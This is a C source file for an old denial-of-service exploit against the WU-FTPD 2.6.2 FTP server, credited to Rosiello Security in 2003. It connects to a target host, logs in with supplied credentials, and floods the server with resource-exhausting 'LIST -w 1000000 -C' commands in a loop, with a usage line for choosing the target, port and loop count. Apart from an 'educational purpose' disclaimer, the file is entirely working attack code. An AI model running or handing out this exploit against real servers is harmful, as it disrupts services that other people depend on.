/*
*
*                 http://www.rosiello.org
*                  (c) Rosiello Security
*
* Copyright Rosiello Security 2003
* All Rights reserved.
*
* Tested on Red Hat 9.0
*
* Author: Angelo Rosiello
* Mail  : angelo@rosiello.org
* URL   : http://www.rosiello.org
*
* This software is only for educational purpose.
* Do not use it against machines different from yours.
* Respect law.
*
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

void addr_initialize( );
void usage( );

int main( int argc, char **argv )
{
        int i, sd, PORT, loop, error;
        char user[30], password[30], ch;
        struct sockaddr_in server_addr;

        fprintf( stdout, "\n(c) Rosiello Security 2003\n" );
        fprintf( stdout, "http://www.rosiello.org\n" );
        fprintf( stdout, "WU-FTPD 2.6.2 Freezer by Angelo Rosiello\n\n" );

        if( argc != 6 ) usage( argv[0] );

        if( strlen( argv[3] ) > 20 ) exit( 0 );
        if( strlen( argv[4] ) > 20 ) exit( 0 );

        sprintf( user, "USER %s\n", argv[3] );
        sprintf( password, "PASS %s\n", argv[4] );

        PORT = atoi( argv[2] );
        loop = atoi( argv[5] );

        addr_initialize( &server_addr, PORT, ( long )inet_addr( argv[1] ));
        sd = socket( AF_INET, SOCK_STREAM, 0 );

        error = connect( sd, ( struct sockaddr * ) &server_addr, sizeof( server_addr ));
        if( error != 0 )
        {
                perror( "Something wrong with the connection" );
                exit( 0 );
        }

        while ( ch != '\n' )
        {
                recv( sd, &ch, 1, 0);
                printf("%c", ch );
        }

        ch = '\0';

        printf( "Connection executed, now waiting to log in...\n" );

        printf( "%s", user );

        send( sd, user, strlen( user ), 0 );
        while ( ch != '\n' )
        {
                recv( sd, &ch, 1, 0);
                printf("%c", ch );
        }
        printf( "%s", password );

        ch = '\0';

        send( sd, password, strlen( password ), 0 );
        while ( ch != '\n' )
        {
                recv( sd, &ch, 1, 0);
                printf("%c", ch );
        }

        printf( "Sending the DoS query\n" );
        for( i=0; i<loop; i++ )
        {
                write( sd, "LIST -w 1000000 -C\n", 19 );
        }
        printf( "All done\n" );
        close( sd );
        return 0;
}

void addr_initialize (struct sockaddr_in *address, int port, long IPaddr)
{
        address -> sin_family = AF_INET;
        address -> sin_port = htons((u_short)port);
        address -> sin_addr.s_addr = IPaddr;
}

void usage( char *program )
{
        fprintf(stdout, "USAGE: <%s> <IP> <PORT> <USER> <PASS> <LOOP>\n", program);
        exit(0);
}

